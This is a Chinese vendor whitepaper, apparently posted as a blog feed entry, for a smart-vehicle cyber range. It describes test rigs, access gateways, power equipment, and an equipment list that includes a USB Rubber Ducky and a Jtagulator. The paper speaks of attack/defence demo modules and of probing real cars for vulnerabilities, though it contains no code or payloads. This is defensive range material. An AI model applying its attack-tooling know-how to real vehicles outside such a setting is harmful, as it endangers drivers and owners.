USB线</td><td>硬件</td><td>5个</td></tr><tr><td></td><td></td><td>接线插头</td><td>硬件</td><td>450个</td></tr><tr><td></td><td></td><td>DB9接头</td><td>硬件</td><td>40套</td></tr><tr><td></td><td></td><td>OBD线</td><td>硬件</td><td>5套</td></tr><tr><td></td><td></td><td>双工头USB</td><td>硬件</td><td>20个</td></tr><tr><td></td><td>硬件调试工具</td><td>多用途调试器</td><td>软硬一体</td><td>1台</td></tr><tr><td></td><td></td><td>Renesas调试器</td><td>硬件</td><td>5套</td></tr><tr><td></td><td></td><td>UART工具</td><td>硬件</td><td>10套</td></tr><tr><td></td><td></td><td>EMMC底座</td><td>硬件</td><td>5套</td></tr><tr><td></td><td></td><td>ECU探针</td><td>硬件</td><td>4套</td></tr><tr><td></td><td></td><td>Jtagulator</td><td>硬件</td><td>5套</td></tr><tr><td></td><td></td><td>infineon芯片调试器</td><td>硬件</td><td>5套</td></tr><tr><td></td><td></td><td>JLINK调试器转接板</td><td>硬件</td><td>10套</td></tr><tr><td></td><td></td><td>芯片通用测试钩</td><td>硬件</td><td>10个</td></tr><tr><td></td><td>USB测试工具集</td><td>模糊测试工具板</td><td>硬件</td><td>2套</td></tr><tr><td></td><td></td><td>USB Rubber Ducky</td><td>硬件</td><td>2个</td></tr><tr><td></td><td></td><td>USB无线网卡</td><td>硬件</td><td>15个</td></tr><tr><td></td><td></td><td>USB分线器</td><td>硬件</td><td>10个</td></tr><tr><td></td><td></td><td>USB调试工具</td><td>硬件</td><td>1个</td></tr><tr><td></td><td>硬件电源工具</td><td>直流稳压电源</td><td>硬件</td><td>10台</td></tr><tr><td></td><td></td><td>DC12V/10A</td><td>硬件</td><td>20个</td></tr><tr><td></td><td></td><td>分控8孔3米插排</td><td>硬件</td><td>20个</td></tr><tr><td></td><td></td><td>分控8孔5米插排</td><td>硬件</td><td>20个</td></tr><tr><td></td><td></td><td>汽车电瓶充电器</td><td>硬件</td><td>1套</td></tr><tr><td></td><td></td><td>车载应急启动电源</td><td>硬件</td><td>1套</td></tr><tr><td></td><td>车载以太网转换工具</td><td>100BASE-T1转Tx</td><td>硬件</td><td>20套</td></tr><tr><td></td><td></td><td>1000BASE-T1转Tx</td><td>硬件</td><td>20套</td></tr><tr><td></td><td>硬件整理工具</td><td>标签打印机</td><td>硬件</td><td>1个</td></tr><tr><td></td><td></td><td>便携式打印机</td><td>硬件</td><td>1个</td></tr><tr><td></td><td></td><td>零部件整理箱</td><td>硬件</td><td>20个</td></tr><tr><td></td><td>硬件射频工具</td><td>射频工具</td><td>硬件</td><td>2个</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="posts/0/"/>
      <url>posts/0/</url>
      
        <content type="html"><![CDATA[<p><strong>国利网安汽车接入系统技术白皮书</strong></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f0f87ae178beabba34ab47812799c4cb.png"></p><p>浙江国利网安科技有限公司</p><p>目 录</p><p>1 智能汽车网络靶场汽车接入系统 1</p><p>1.1 总体概述 1</p><p>1.2 系统概述 1</p><p>1.3 汽车接入系统 2</p><p>1.3.1 车型测试台架 2</p><p>1.3.2 零部件接入网关 2</p><p>1.3.3 动态测试接入网关 3</p><p>1.3.4 演示模块 4</p><p>1.4 交付文档 4</p><p>2 智能汽车网络靶场车型测试台架 5</p><p>2.1 总体概述 5</p><p>2.2 台架功能及参数介绍 6</p><p>2.2.1 产品外观 6</p><p>2.2.2 台架布线 10</p><p>2.2.3 台架面板 11</p><p>2.2.4 台架背板 13</p><p>2.2.5 5BOB盒 15</p><p>2.2.6 电源管理模块 16</p><p>2.2.7 电源模块 16</p><p>2.2.8 程控上位机 30</p><p>3 智能汽车网络靶场零部件接入网关 32</p><p>3.1 零部件接入网关 33</p><p>3.1.1 接入网关柜体 33</p><p>3.1.2 LTE接入模块 35</p><p>3.1.3 LTE-5G接入模块 74</p><p>3.1.4 信号屏蔽箱 88</p><p>3.1.5 移动平台 88</p><p>3.1.6 GNSS接入模块 89</p><p>3.1.7 射频及无线电接入模块 99</p><p>3.1.8 蓝牙/WiFi接入模块 100</p><p>3.1.9 调试口接入模块 103</p><p>3.1.10 车载网络接入模块 105</p><p>3.1.11 程控上位机 111</p><p>3.1.12 零部件虚拟化接入模块 113</p><p>4 智能汽车网络靶场动态测试接入网关 115</p><p>4.1 智能汽车网络靶场动态测试接入网关 115</p><p>4.1.1 方案 116</p><p>4.2 车载无线通信网关 118</p><p>4.3 车载网络通信网关 121</p><p>4.4 调试桥网关 125</p><p>5 智能汽车网络靶场演示模块 127</p><p>5.1 智能汽车网络靶场演示 127</p><p>5.1.1 OTA远程升级攻防演示模块 127</p><p>5.1.2 数字钥匙攻防演示模块 130</p><p>5.1.3 V2X攻防演示模块 133</p><p>5.1.4 自动驾驶演示模块 137</p><p>5.1.5 异地互联演示模块 141</p><p>5.1.6 整车厂网络攻防演练演示模块 142</p><p>5.1.7 联邦靶场攻防演练演示模块 146</p><h1 id="智能汽车网络靶场汽车接入系统"><a href="#智能汽车网络靶场汽车接入系统" class="headerlink" title="智能汽车网络靶场汽车接入系统"></a>智能汽车网络靶场汽车接入系统</h1><h2 id="总体概述"><a href="#总体概述" class="headerlink" title="总体概述"></a>总体概述</h2><p>汽车接入系统为智能汽车网络靶场提供针对零部件、台架、实车、HIL、VIL与靶场基础平台进行连接，提供多种访问接口，实现虚实互联。</p><h2 id="系统概述"><a href="#系统概述" class="headerlink" title="系统概述"></a>系统概述</h2><p>汽车接入系统主要包括车型测试台架、零部件接入网关、零部件虚拟化接入模块、动态试验接入网关。</p><p>车型测试台架满足相关控制器（网关、IVI、TBOX、以及附属仪表、大屏、开关等控制器）连接要求，同时控制器I/O引脚均连接到对应测试板卡，可实现部分内容自动化测试，也可通过真实部件输入输出进行手动测试。</p><p>零部件接入网关从车型零部件台架上将零部件的USB调试接口、CAN总线接口、车载以太网接口、蓝牙接口、WiFi接口、射频及无线电接口、GNSS接口、LTE蜂窝网络接口接入到靶场基础平台，可分配设备的使用权给不同的靶场测试环境。</p><p>零部件虚拟化接入模块虚拟化单个软件组件和完全配置的ECU的软件。支持整个ECU开发过程中的功能和软件开发人员、软件集成商和测试工程师。可以结合行为模型或虚拟化的、完整的AUTOSAR基本软件开发和测试功能软件。</p><p>动态试验接入网关支持LTE通信，无线接入靶场，以用于车辆在转毂、测试场地等动态测试需求。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/918f590252eef61e96a907d2887ff60c.png" alt="社交网络的手机截图 描述已自动生成"></p><h2 id="汽车接入系统"><a href="#汽车接入系统" class="headerlink" title="汽车接入系统"></a>汽车接入系统</h2><h3 id="车型测试台架"><a href="#车型测试台架" class="headerlink" title="车型测试台架"></a>车型测试台架</h3><p>台架满足相关控制器（网关、IVI、TBOX、以及附属仪表、大屏、开关等控制器）连接要求，同时控制器I/O引脚均连接到对应测试板卡，可实现部分内容自动化测试，也可通过真实部件输入输出进行手动测试。实验台均满足实验室常规工作环境要求，实验台实际尺寸、造型等设计方案根据器件布置情况经与最终用户共同协商后进行确定，并可方便移动。</p><h3 id="零部件接入网关"><a href="#零部件接入网关" class="headerlink" title="零部件接入网关"></a>零部件接入网关</h3><p>具备柜体及电源控制模块、接口面板用于零部件电源及硬线信号接入。具备LTE、GNSS、射频信号、蓝牙、WiFi等无线信号接入功能，以针对TBOX、IVI等具备无线通信能力的零部件接入。提供调试口、CAN总线、车载以太网等车内接口的接入能力，满足零部件接入靶场进行测试与调试。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/377727dd11f9bab3796f621f26a078a4.png" alt="图形用户界面 描述已自动生成"></p><h3 id="动态测试接入网关"><a href="#动态测试接入网关" class="headerlink" title="动态测试接入网关"></a>动态测试接入网关</h3><p>智能汽车网络靶场动态测试接入网关将实车蓝牙、Wi-Fi、车内总线与娱乐系统访问点接入智能汽车网络靶场，通过靶场系统访问实车接入设备，并对实车发起攻击、逆向，挖掘实车漏洞，并上报到靶场基础平台，实现实车漏洞挖掘闭环，同时可避免漏洞外泄，保证了演练、竞赛等安全性、可控性。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/82c8a3fbb2aed41fda55c808f08ce90b.png"></p><h3 id="演示模块"><a href="#演示模块" class="headerlink" title="演示模块"></a>演示模块</h3><p>智能汽车网络靶场演示模块具备以下能力：为靶场攻防测试提供预制演示方案。</p><p>演示模块需要以智能网联汽车为基础，以智能网联业务为背景，演示过程清晰，演示结果明显、可控。演示场景至少应包含OTA远程升级、数字钥匙、V2X、自动驾驶及异地互联攻防演练。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/c93017fffd0c863914297524405028b4.png" alt="C-V2X"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/dbf5181534a3ddb03b6615f64ee72767.jpeg" alt="自动驾驶车辆仿真模拟软件盘点_搜狐汽车_搜狐网"></p><h2 id="交付文档"><a href="#交付文档" class="headerlink" title="交付文档"></a>交付文档</h2><p>汽车接入系统部分交付以下文档：</p><table><thead><tr><th>序号</th><th>所属系统</th><th>文档名称</th><th>数量</th><th>备注</th></tr></thead><tbody><tr><td>1</td><td>汽车接入系统</td><td>车型测试台架使用及维护手册</td><td>1套</td><td>文档</td></tr><tr><td>2</td><td></td><td>零部件接入网关使用及维护手册</td><td>1套</td><td>文档</td></tr><tr><td>3</td><td></td><td>零部件虚拟化接入模块使用手册</td><td>1套</td><td>文档</td></tr><tr><td>4</td><td></td><td>动态测试接入网关使用及维护手册</td><td>1套</td><td>文档</td></tr><tr><td>5</td><td></td><td>演示模块使用手册</td><td>1套</td><td>文档</td></tr><tr><td>6</td><td></td><td>智能汽车网络靶场安全目标导入流程</td><td>1套</td><td>文档</td></tr><tr><td>7</td><td></td><td>智能汽车网络靶场零部件测试流程</td><td>1套</td><td>文档</td></tr><tr><td>8</td><td></td><td>智能汽车网络靶场整车测试流程</td><td>1套</td><td>文档</td></tr><tr><td>9</td><td></td><td>智能汽车网络靶场HIL测试流程</td><td>1套</td><td>文档</td></tr><tr><td>10</td><td></td><td>智能汽车网络靶场VIL测试流程</td><td>1套</td><td>文档</td></tr></tbody></table><h1 id="智能汽车网络靶场车型测试台架"><a href="#智能汽车网络靶场车型测试台架" class="headerlink" title="智能汽车网络靶场车型测试台架"></a>智能汽车网络靶场车型测试台架</h1><h2 id="总体概述-1"><a href="#总体概述-1" class="headerlink" title="总体概述"></a>总体概述</h2><p>本方案提供定制台架满足相关控制器（网关、IVI、TBOX、以及附属仪表、大屏、开关等控制器）连接要求，同时控制器I/O引脚均连接到对应测试板卡，可实现部分内容自动化测试，也可通过真实部件输入输出进行手动测试。实验台均满足实验室常规工作环境要求，实验台实际尺寸、造型等设计方案根据器件布置情况经与最终用户共同协商后进行确定，并可方便移动。</p><p>测试台架设备的面板材料均采用厚度适宜的金属面板，颜色均考虑整体美观度，且不重，打孔过线方便，与台架主体容易拆装，更换不同车型控制器面板便捷。测试台架设备可最大布置20个控制器，控制器安装合理，操作方便，拆装容易，可扩展。测试台架设备的台架主体与控制器面板之间通过接口对插方式进行连接，此接口管脚做好预留，方便不同车型控制器面板更换。测试台架设备额外预留5个控制器面板，方便后续开发车型扩展使用，同时面板材料在验收后5年内可以持续采购供应。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/293937b724194774edf1a682dabd9e35.png" alt="表格 描述已自动生成"></p><p>测试台架设备的实验台上各控制器的电源线和地线均连接到公共的汇流条，以减少线压降。在测试过程中对各控制器的电源、地漂移、以及负载驱动线压降均不能等于0.5V。</p><p>放置控制器单元格面板支持可翻开和推进台架内部隐藏。</p><p>我司为本项目提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：GLhardware</p><p>数量：7套</p><p>指标参数信息如下：</p><ol><li>测试台架设备可布置20个控制器；</li><li>台架尺寸2650mm x 1200mm x 2050mm（长x宽x高），其中桌面尺寸达到2650mm x 600mm ；</li><li>台架应能容纳2个工位；</li><li>台架应配备独立的电源设备放置区域，不占据零部件区域；</li><li>每个台架配备1个5口千兆交换机。</li></ol><h2 id="台架功能及参数介绍"><a href="#台架功能及参数介绍" class="headerlink" title="台架功能及参数介绍"></a>台架功能及参数介绍</h2><h3 id="产品外观"><a href="#产品外观" class="headerlink" title="产品外观"></a>产品外观</h3><p>本方案为XXXX汽车网络靶场提供7套测试台架，测试台架采用定制外观，外观结合XXXX新能源logo设计风格及配色进行定制设计，测试台架按照可布置20个控制器进行分区隔断设计，台架尺寸设计为2600mm*1200mm*2000mm,为考虑方便测试人员办公，台架桌面尺寸设计为2600mm*600mm，可同时容纳2个测试人员办公，台架桌面下方配备独立的电源设备区用来放置电源。</p><p>功能参数如下：</p><p>我司为本项目提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：GLhardware</p><p>数量：7套</p><p>指标参数信息如下：</p><ol><li>测试台架设备可布置20个控制器；</li><li>台架尺寸2650mm x 1200mm x 2050mm（长x宽x高），其中桌面尺寸达到2650mm x 600mm ；</li><li>台架能容纳2个工位；</li><li>台架应配备独立的电源设备放置区域，不占据零部件区域；</li><li>每个台架配备1个5口千兆交换机。</li></ol><p>响应方案如下：</p><ol><li>硬件设计</li></ol><p>控制器布置：台架应能够布置至少20个控制器。</p><p>台架整体尺寸：2650mm x 1200mm x 2050mm（长x宽x高）。</p><p>工作桌面尺寸：2650mm x 600mm。</p><ol><li>工位配置</li></ol><p>工位容量：台架应能容纳2个工位，以便同时进行多项测试。</p><ol><li>电源管理</li></ol><p>电源设备区域：台架应配备独立的电源设备放置区域，以避免与测试零部件区域混合。</p><ol><li>网络设备</li></ol><p>网络设备：每个台架配备1个5口千兆交换机，以满足网络连接需求。</p><ol><li>结构设计</li></ol><p>材料选择：采用高强度钢材，确保结构稳定性和耐用性。</p><p>层架设计：台架分为多层，上层用于放置控制器，下层用于电源设备和网络设备的安置。</p><p>防静电处理：工作台面进行防静电处理，防止静电损害敏感设备。</p><ol><li>工位布局</li></ol><p>人体工程学设计：工位设计考虑人体工程学，确保测试人员的舒适性。</p><p>灵活配置：工位之间采用可移动隔板，根据测试需求灵活调整空间。</p><ol><li>电源管理</li></ol><p>独立电源区：设计独立的电源设备区域，配备必要的插座和电源线路管理系统。</p><p>安全保护：电源区域配备漏电保护和过载保护装置。</p><ol><li>网络连接</li></ol><p>集中交换机布置：在台架中心位置设立网络设备区，集中管理网络连接。</p><p>线路管理：内置线缆管理系统，确保网络线路的整洁和安全。</p><ol><li>辅助功能</li></ol><p>监控摄像头：在台架上方配备监控摄像头，用于记录测试过程。</p><p>照明系统：提供足够的照明设备，保证工位光线充足。</p><ol><li>技术规格</li></ol><p>承重能力：台架每层承重不低于100kg，确保可以安全放置各种测试设备。</p><p>耐用性：台架表面采用耐磨材料，保证长期使用下的耐用性。</p><p>网络带宽：千兆交换机保证网络测试时的高速数据传输。</p><ol><li>安全措施</li></ol><p>防撞角设计：台架各角采用圆滑处理或加装防撞角，避免操作人员受伤。</p><p>静电放电系统：设计静电放电系统，减少静电干扰和损害。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/8c6443a8cd244f5803a7cd73eb51a918.png"></p><p>（测试台架外观设计图）</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/297c4b359e58fece264b821dd56090f6.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/9d76d7402e40c883a9a2254938639c6c.png"></p><h3 id="台架布线"><a href="#台架布线" class="headerlink" title="台架布线"></a>台架布线</h3><p>功能参数如下：</p><ol><li>我司提供的台架内所有线束均遵循国际标准，线束不裸露在外面，台架内部线束布局合理有序，主要线束做好线号标记，方便排查问题。同时做好其他车型线束预留，方便其它车型共用台架。所有台架内部线束都布置在线槽内；</li><li>我司根据网络拓扑结构对控制器进行布线与排布，网络拓扑结构可通过LED灯带方式或者其他方式呈现；</li><li>我司提供零部件车载以太网连接线材。</li></ol><p>响应方案如下：</p><p>台架上挂置的零部件设备需要通过台架进行线路连接，包含进线和出线口设计，本次方案所使用的台架走线方式采用背板走线，在台架零部件放置区域背板处都单独设计有接口和线槽，在零部件放置时需先通过接口进行线路的穿接，将线束引至背板，在将线束固定在线槽里面，保证美观的同时也方便后期的维护。</p><h3 id="台架面板"><a href="#台架面板" class="headerlink" title="台架面板"></a>台架面板</h3><p>功能参数如下：</p><ol><li>提供16路CAN接口（DB9）,以太网接口12个（RJ45），USB接口2个，插排8个插口（支持3孔和2孔）；</li><li>具备2个车载以太网转传统以太网调试接口，面板预留T1和TX接口，可在接口面板实现转换；</li><li>测试台架设备支持实验台与电控系统、负载开关、机柜本体间的连接使用可方便断开和连接的接插件端子台的形式，无需使用工具即可方便快捷的更换电控系统、真实负载及真实开关；</li><li>测试台架设备的试验台安装方便灵活，控制器能够应用到后续车型中，不需额外改线布局就能在总线之间灵活移动安装</li><li>电源接口、CAN/CAN-FD/LIN接口、诊断接口等常用测试接口引至测试系统前面板上，高度合适方便测试人员操作；</li><li>测试系统各部分之间的走线均在台架背面进行，且不影响机柜后门的关闭与打开；</li><li>所有ECU和负载都可通过标准的接插件在系统正面进行更换，无需使用额外工具，接插件不能外露；</li><li>所有ECU和负载管脚信号及扩展变型均连接到标准的接插件上；</li><li>试验台布置与其他测试模块硬件接口位置合理，以便测试系统调用控制配合相应系统集成测试内容验证；</li><li>试验台与机柜之间的连接均与机柜相匹配，使用特定的某接口，并且满足能够同时与多个机柜连接的要求。</li><li>面板配备蜂窝区域用于车机屏幕挂载，蜂窝面板黑色、孔径1厘米，与正面齐平，与桌面距离留空距离5厘米；防静电皮的接地线连接至蜂窝板。</li></ol><p>台架面板主要是针对对于零部件的测试接口的外露，通过将线束将各零部件接口接到台架面板上，方便测试人员进行相应的测试工作，台架面板具备对应的接口编号，以方便测试人员进行区分。</p><p>响应方案如下：</p><ol><li>方案设计</li></ol><p>多接口支持：提供16路CAN接口、12个以太网接口、2个USB接口、8个插排插口。</p><p>车载网络转换：2个车载以太网转传统以太网接口，预留T1和TX接口。</p><p>便捷连接：使用接插件端子台形式连接实验台与电控系统、负载开关、机柜本体。</p><p>灵活安装：控制器安装方便，可适用于后续车型，无需改线。</p><p>前面板设计：所有常用测试接口引至前面板，高度合适，方便操作。</p><p>走线管理：台架背面走线，不影响机柜后门操作。</p><p>接插件更换：ECU和负载通过前面板标准接插件更换，无需工具。</p><p>硬件接口布局：试验台与其他测试模块硬件接口位置合理，便于系统集成测试。</p><p>机柜连接：试验台与机柜连接匹配，支持与多个机柜同时连接。</p><ol><li>结构设计</li></ol><p>台架尺寸：符合设备布置要求，保证足够的工作空间和操作便利性。</p><p>材质选择：采用防静电材料，确保设备和测试人员的安全。</p><p>接口与连接设计</p><p>接口面板：所有接口均集中在前面板，易于访问和操作。</p><p>接插件端子台：采用标准化接插件，便于快速连接和断开。</p><p>电源管理区：独立的电源设备放置区域，配备必要的电源插口。</p><p>安装与维护</p><p>控制器安装：设计模块化安装架，支持快速更换和升级控制器。</p><p>维护通道：确保走线整洁，维护通道清晰，便于检查和修理。</p><p>车机屏幕挂载区</p><p>蜂窝面板：配备专用于车机屏幕挂载的蜂窝区域，保证屏幕安全稳定地安装。</p><p>防静电处理：蜂窝板连接防静电皮的接地线，防止静电损害敏感元件。</p><ol><li>安全与环境考虑</li></ol><p>防静电措施：整个台架和工作区域均采取防静电措施，包括防静电地面和接地处理。</p><p>人体工程学：台架设计考虑人体工程学，确保测试人员长时间工作的舒适性。</p><p>技术规格</p><p>接口规格：确保所有接口符合行业标准，兼容性强。</p><p>负载能力：台架设计能承受预期的最大负载，保证稳定性。</p><p>网络设备配置：每个台架配备高性能千兆交换机，满足测试需求。</p><ol><li>安全措施</li></ol><p>接插件保护：设计保护措施，避免接插件外露，保证安全。</p><p>电源安全：电源设备区域配备过载保护，确保测试过程中的电源安全。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/5e022e7e2e90fc93d1104bef500d93d5.png"></p><p>（测试台架样图）</p><h3 id="台架背板"><a href="#台架背板" class="headerlink" title="台架背板"></a>台架背板</h3><p>功能参数如下：</p><ol><li>背面3个后门；</li><li>后门向下延伸到桌面位置；</li><li>采用外开方式打开；</li><li>每个DUT格子包含8个CAN（DB9）接口；</li><li>台架中有两个DUT格子包含1个普通以太网调试口；</li><li>台架中有两个DUT格子包含1个USB调试口；</li><li>每个DUT格子包含一组KLR、KL15、KL30、KL31接口；</li><li>每个DUT格子包含一组VCC、VBAT接口；</li><li>每个DUT格子包含一组控制及信号传输接口CNT（RJ45）；</li><li>台架中有6个DUT格子带有6个车载以太网（RJ45）接口。</li></ol><p>响应方案如下：</p><p>台架背板设计主要是要考虑到方便后期维护及测试人员的接线方便等因素，所以本方案的台架背板提供了3个外开后门，台架背板可直接对台架零部件放置区域的接线接口进行维护。</p><ol><li>设计要求</li></ol><p>后门设计：3个后门，外开方式，延伸至桌面位置。</p><p>DUT（Device Under Test）格子：每个格子包含特定的接口配置。</p><p>接口配置：包括CAN接口、以太网接口、USB接口、车辆电源接口、控制及信号传输接口等。</p><ol><li>后门设计</li></ol><p>数量与位置：台架背面配备3个后门，便于设备内部的访问和维护。</p><p>结构：后门向下延伸至桌面位置，保证了足够的开启角度，便于操作。</p><p>开启方式：后门采用外开方式，确保开门时不会干扰台架两侧的工作空间。</p><ol><li>DUT格子设计</li></ol><p>CAN接口配置：每个DUT格子包含8个CAN（DB9）接口，满足多路CAN通信测试需求。</p><p>以太网调试口：两个DUT格子中各包含1个普通以太网调试口，用于网络通信测试。</p><p>USB调试口：两个DUT格子中各包含1个USB调试口，用于设备配置或数据传输。</p><p>车辆电源接口：每个DUT格子包含一组KLR、KL15、KL30、KL31接口，模拟车辆不同电源状态。</p><p>电源输入接口：每个DUT格子包含一组VCC、VBAT接口，提供稳定的电源输入。</p><p>控制及信号传输接口：每个DUT格子包含一组CNT（RJ45）接口，用于控制信号的传输。</p><p>车载以太网接口：6个DUT格子各带有6个车载以太网（RJ45）接口，支持高速车载网络测试。</p><ol><li>其他设计细节</li></ol><p>标准化接口：所有接口均采用行业标准，以保证与各种测试设备的兼容性。</p><p>模块化设计：DUT格子模块化设计，便于未来扩展或更换。</p><p>接口保护：设计接口防护措施，避免在操作过程中对接口造成损害。</p><p>走线管理：内部走线整洁，易于管理，确保信号的传输质量与安全性。</p><p>散热设计：后门设计考虑散热需求，保证设备在长时间运行下的稳定性。</p><p>安全考虑：所有电源接口均有明确的标识和保护措施，防止误操作引起的安全问题。</p><ol><li>安全措施</li></ol><p>防静电设计：所有接口和操作区域均进行防静电设计，确保设备和人员安全。</p><p>电源隔离：电源接口与信号接口物理隔离，减少干扰，提高测试准确性。</p><p>紧急停止按钮：台架配备紧急停止按钮，确保在出现意外时能立即切断电源。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/a73d0b7e4ed45595eb1baf56ebe67fe1.png"></p><h3 id="5BOB盒"><a href="#5BOB盒" class="headerlink" title="5BOB盒"></a>5BOB盒</h3><p>功能参数如下：</p><p>测试台架设备上的每个控制器格子可独立上下电，支持通过BOB控制盒或控制类板卡控制器上电控制，每个控制器格子都能被BOB盒控制，实现集成测试环境下短路/断路等故障注入测试，断线测试盒或者控制类板卡均满足可编程控制，同时数量可扩展。</p><p>响应方案如下：</p><p>概述</p><p>本技术方案旨在构建一个高度可控、灵活的测试台架环境，利用BOB（Break-Out Box）台架盒子实现对测试台架上每个控制器的精准控制。这将支持集成测试环境下的故障注入测试，包括短路、断路等情况，并确保所有控制器格子都能通过BOB盒或控制类板卡进行上电控制。</p><p>核心组件</p><p>BOB台架盒子：作为测试环境的中心枢纽，BOB盒子将提供对每个控制器格子的独立上下电控制，允许测试人员模拟各类故障情况。</p><p>控制类板卡：用于实现对控制器的精细化电源管理，支持编程控制以适应不同的测试场景。</p><p>断线测试盒：配合BOB盒子使用，用于断路测试，提供实时反馈和诊断数据。</p><p>功能特点</p><p>独立上下电控制：每个控制器格子都可以独立控制，不会影响到台架上的其他控制器，提高了测试的灵活性和精确性。</p><p>双重控制机制：既可以通过BOB控制盒进行物理控制，也可以通过控制类板卡实现软件层面的控制，确保测试的便捷性和自动化程度。</p><p>故障注入测试：BOB台架盒子可以模拟短路和断路等多种故障情况，帮助检测控制器在异常状态下的表现。</p><p>可编程控制：断线测试盒和控制类板卡支持可编程控制，允许测试人员根据测试需求编写脚本，实现自定义测试流程。</p><p>可扩展性：系统设计允许在未来根据测试需求增加更多的控制器格子和测试盒，无需更换现有硬件，保护了初期投资。</p><p>硬件集成：将BOB盒子、断线测试盒和控制类板卡集成到测试台架中。</p><p>软件开发：开发控制软件，实现对硬件的编程控制，并提供用户友好的界面。</p><p>测试与验证：执行全面的测试以验证系统的功能和可靠性。</p><h3 id="电源管理模块"><a href="#电源管理模块" class="headerlink" title="电源管理模块"></a>电源管理模块</h3><p>功能参数如下：</p><ol><li>支持总开关、空气开关、操作开关与应急开关；</li><li>控制开关额定电流16A，额定电压440V，额定分断电流10kA。</li></ol><p>电源管理模块是一种用于管理电力供应和控制电源设备的模块。它通常被用于电子设备或系统中，用于确保电源的稳定供应、有效管理功耗和延长电池寿命。</p><p>电源管理模块的功能通常包括以下几个方面：</p><p>1. 电源开关控制：可以控制电源的开关状态，例如打开或关闭电源供应。</p><p>2. 电源监控：能够实时监测电源的电压、电流和温度等参数，确保电源工作在安全范围内。</p><p>3. 电量管理：用于监测和管理电池的电量，提醒用户及时充电或优化电池使用。</p><p>4. 电源适配：根据设备的需求，通过调节电压和电流等参数，提供适合设备工作的电源输出。</p><p>5. 节能管理：通过优化电源的功耗控制，延长设备的使用时间和电池寿命，降低能源消耗。</p><p>总之，电源管理模块在电子设备中起到重要的作用，帮助实现电源的稳定供应、功耗管理和延长电池寿命等功能。</p><h3 id="电源模块"><a href="#电源模块" class="headerlink" title="电源模块"></a>电源模块</h3><p>台架电源是一种专门用于实验室环境的电源设备，用于提供稳定、可调节的电源输出，以满足实验和测试的需求。</p><p>台架电源通常具备以下特点和功能：</p><p>1. 可调节输出：台架电源可以通过旋钮或数字控制界面，方便地调节输出电压和电流，以适应不同实验的需求。</p><p>2. 稳定性和精度：台架电源具备高稳定性和精度，能够提供稳定的电源输出，以确保实验结果的准确性。</p><p>3. 保护功能：台架电源通常具备过载保护、短路保护和过温保护等功能，以确保实验过程中设备的安全运行。</p><p>4. 多通道输出：一些台架电源具备多通道输出的功能，可以同时提供多个电源输出，以满足多个设备的供电需求。</p><p>5. 远程控制：一些高级电源可以通过远程控制接口，如RS232、USB或以太网连接，实现远程控制和监控。</p><p>我司为本项目提供的该产品信息如下：</p><p>品牌：艾德克斯</p><p>型号：IT6522D</p><p>数量：7套</p><p>指标参数信息如下：</p><ul><li>产品参数介绍</li></ul><ol><li>电压范围0-80V；</li><li>电流最大120A；</li><li>功率最大3000W；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f35dcc91b2ea26285c5deab85a2e5692.png"></p><ol><li>电压设定值解析度：10mV；</li><li>电流设定值解析度：10mA；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/9b7fe91f149d807b5dcadbc699f1cba8.png"></p><ol><li>支持输出阻抗设定功能；</li><li>支持源OVP、OCP、OPP，Vsense反接保护，掉电及输入欠压保护；</li><li>远端量测功能；</li><li>模拟量控制接口；</li><li>内置USB/RS232/CAN/LAN 通讯接口。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/05de495a7f0acb43a3c7b0b5d979d674.png"></p><ol><li>产品截图</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/a55b54dfa5ebf42d78437533027c4b87.png"></p><ol><li>产品规格书</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/58e6aace4f280eb4b159b505c57fd429.jpeg" alt="IT6500-cn_00"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/8a6cde0ea7e6011fbbf037689bc5bf49.jpeg" alt="IT6500-cn_01"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/18833bdd02ecfbc1da7c2fd920e02552.jpeg" alt="IT6500-cn_02"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/361e29c2b40217b35ea0f166e4ca1857.jpeg" alt="IT6500-cn_03"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/49425150dcca161c54b9a9d79a537de7.jpeg" alt="IT6500-cn_04"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/29dfd319ef2cb7dc394b83cb44be1ee2.jpeg" alt="IT6500-cn_05"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/54e70323283d149c1f60f0d9f152fbda.jpeg" alt="IT6500-cn_06"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/5577282ef5c29dd0d6aac93d9b34d4a5.jpeg" alt="IT6500-cn_07"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" 